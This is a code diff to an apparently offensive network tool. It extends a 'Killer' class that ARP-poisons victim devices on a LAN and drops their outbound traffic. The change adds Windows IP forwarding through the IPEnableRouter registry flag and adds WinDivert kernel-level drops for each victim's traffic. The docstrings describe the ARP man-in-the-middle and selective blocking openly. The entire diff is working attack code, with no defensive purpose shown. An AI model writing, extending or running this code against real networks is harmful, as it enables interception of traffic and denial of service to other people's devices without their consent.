@@ -18,14 +18,18 @@ log = logging.getLogger(__name__)
 def enable_ip_forwarding() -> bool:
     """Turn on kernel IP forwarding so selective blocks forward allowed traffic.
 
-    macOS/Linux use a sysctl. Windows has no sysctl equivalent for ARP-MITM'd
-    traffic; that path will use WinDivert once implemented (see build/privilege
-    specs).
+    macOS/Linux flip a sysctl. Windows has no sysctl equivalent for ARP-MITM'd
+    traffic, so it sets the ``IPEnableRouter`` registry flag (the analogue) via
+    the WinDivert forwarding module; the WinDivert handle drops the filtered
+    flows while the kernel forwards the rest (see ``networking.windivert_forwarder``).
     """
     if sys.platform == 'darwin':
         key = 'net.inet.ip.forwarding'
     elif sys.platform.startswith('linux'):
         key = 'net.ipv4.ip_forward'
+    elif sys.platform.startswith('win'):
+        from networking.windivert_forwarder import enable_windows_routing
+        return enable_windows_routing()
     else:
         return False
     res = subprocess.run(['sysctl', '-w', f'{key}=1'], capture_output=True, check=False)
@@ -50,6 +54,8 @@ class Killer:
         self.killed: dict[str, dict[str, object]] = {}
         self.storage: dict[str, dict[str, object]] = {}
         self.pf_blocks: set[str] = set()
+        # Windows kernel-forwarder handles, keyed by victim IP (WinDivert path).
+        self._wd_forwarders: dict[str, object] = {}
         self._socket: Optional[object] = None  # Persistent L2 socket
         self._lock: threading.Lock = threading.Lock()  # Guards killed, forwarders, pf_blocks
         # Host-domain blocklist (PSN, GTA, …) over the firewall module.
@@ -171,6 +177,7 @@ class Killer:
                 self._send_packet(to_router)
                 sleep(0.1)
         self._remove_pf_block(victim['ip'])
+        self._remove_windivert_block(victim['ip'])
 
     def kill_all(self, device_list: list[dict[str, object]]) -> None:
         """
@@ -191,6 +198,9 @@ class Killer:
                 self.killed.pop(mac)
             for ip in list(self.pf_blocks):
                 self._remove_pf_block(ip)
+            wd_ips = list(self._wd_forwarders)
+        for ip in wd_ips:
+            self._remove_windivert_block(ip)
         # Close persistent socket when done
         self._close_socket()
     
@@ -226,12 +236,16 @@ class Killer:
     def one_way_kill(self, victim: dict[str, object]) -> None:
         """
         Kill victim and block their outbound traffic.
-        Uses kernel IP forwarding + pf block (fast, no Python overhead).
-        
-        With sysctl net.inet.ip.forwarding=1:
+        Uses kernel IP forwarding + a kernel-level drop (fast, no Python overhead).
+
+        With forwarding enabled (sysctl on mac/linux, IPEnableRouter on Windows):
         - ARP spoof redirects traffic through us
         - Kernel forwards packets at native speed
-        - pf blocks outbound from victim (kernel level, instant)
+        - The filtered flow is dropped in-kernel:
+          * mac/linux — pf/nft ``block drop`` on the victim's outbound;
+          * Windows   — a WinDivert ``NETWORK_FORWARD`` drop for the victim's
+            outbound (the netsh rule alone filtered the attacker's host, not the
+            forwarded victim traffic).
         """
         # Ensure victim is being ARP poisoned
         if victim['mac'] not in self.killed:
@@ -241,9 +255,38 @@ class Killer:
                 sleep(0.1)
                 if victim['mac'] in self.killed:
                     break
-        
-        # Block outbound at kernel level with pf (no slow Python forwarder)
+
+        # Block outbound at kernel level (no slow Python forwarder).
+        if sys.platform.startswith('win'):
+            self._enforce_windivert_block(victim['ip'])
+        # Keep the firewall block as a portable backstop on every OS.
         self._enforce_pf_block(victim['ip'])
+
+    def _enforce_windivert_block(self, victim_ip: str) -> None:
+        """Start (idempotently) a WinDivert kernel drop for the victim's outbound."""
+        with self._lock:
+            if victim_ip in self._wd_forwarders:
+                return
+        try:
+            from networking.windivert_forwarder import WinDivertForwarder, WINDIVERT_AVAILABLE
+            if not WINDIVERT_AVAILABLE:
+                return
+            fwd = WinDivertForwarder()
+            if fwd.start(victim_ip, drop_from_victim=True):
+                with self._lock:
+                    self._wd_forwarders[victim_ip] = fwd
+        except Exception as e:  # noqa: BLE001 - never let the kernel path break a kill
+            log.warning('WinDivert block failed for %s: %s', victim_ip, e)
+
+    def _remove_windivert_block(self, victim_ip: str) -> None:
+        """Stop and drop the WinDivert forwarder for a victim IP, if any."""
+        with self._lock:
+            fwd = self._wd_forwarders.pop(victim_ip, None)
+        if fwd is not None:
+            try:
+                fwd.stop()
+            except Exception as e:  # noqa: BLE001
+                log.debug('WinDivert stop error (ignoring): %s', e)
 
     def _enforce_pf_block(self, victim_ip: str) -> None:
         if victim_ip in self.pf_blocks:
